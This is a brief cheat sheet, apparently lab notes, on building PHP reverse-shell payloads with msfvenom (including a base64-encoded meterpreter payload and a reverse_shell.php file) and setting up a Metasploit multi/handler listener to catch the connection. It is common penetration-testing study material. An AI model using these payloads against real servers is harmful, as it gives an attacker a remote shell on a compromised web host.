# msfvenom -> payload builder in memory

msfvenom --list formats
msfvenom --list payload

# -p : payload file

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

# setting lhost, lport (local)

msf6 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
msf6 exploit(multi/handler) > show options

# exploit run

exploit
run
